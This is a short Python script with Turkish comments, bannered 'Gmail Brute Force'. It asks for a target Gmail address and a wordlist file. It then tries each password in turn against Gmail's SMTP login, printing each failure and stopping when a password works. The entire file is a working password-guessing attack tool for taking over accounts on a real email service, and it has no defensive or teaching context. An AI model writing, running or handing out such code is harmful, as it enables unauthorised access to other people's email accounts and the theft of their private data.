import smtplib
from colorama import init, Fore, Style
import pyfiglet
import os

# Ekranı temizleme fonksiyonu
def clear_screen():
    # Windows için
    if os.name == 'nt':
        _ = os.system('cls')
    # Unix tabanlı sistemler için
    else:
        _ = os.system('clear')

# colorama'yı başlatma
init(autoreset=True)

# Ekranı temizleme
clear_screen()

# Banner oluşturma
banner = pyfiglet.figlet_format("Gmail Brute Force")
print(Fore.CYAN + banner)

# Kullanıcıdan kullanıcı adını (Gmail adresini) alma
username = input(Fore.CYAN + "Lütfen Gmail adresinizi girin: ")

# Kullanıcıdan wordlist dosyasının yolunu alma
wordlist_file = input(Fore.CYAN + "Lütfen wordlist dosyasının yolunu girin: ")

def attempt_login(username, password):
    try:
        # SMTP sunucusuna bağlanma
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()  # Güvenli bağlantı başlatma
        server.login(username, password)  # Oturum açma
        print(Fore.GREEN + f"[SUCCESS] Password found: {password}")
        server.quit()  # Sunucudan çıkış yapma
        return True
    except smtplib.SMTPAuthenticationError:
        print(Fore.RED + f"[FAIL] Incorrect password: {password}")
        return False
    except Exception as e:
        print(Fore.YELLOW + f"[ERROR] An error occurred: {e}")
        return False

# Wordlist dosyasından şifreleri okuma ve deneme
try:
    with open(wordlist_file, "r") as file:
        for line in file:
            password = line.strip()  # Şifreyi satırdan okuma ve boşlukları kaldırma
            if attempt_login(username, password):
                break  # Doğru şifre bulunursa döngüden çık
except FileNotFoundError:
    print(Fore.YELLOW + f"[ERROR] Dosya bulunamadı: {wordlist_file}")
except Exception as e:
    print(Fore.YELLOW + f"[ERROR] Bir hata oluştu: {e}")

print(Fore.CYAN + "Password cracking attempt finished.")
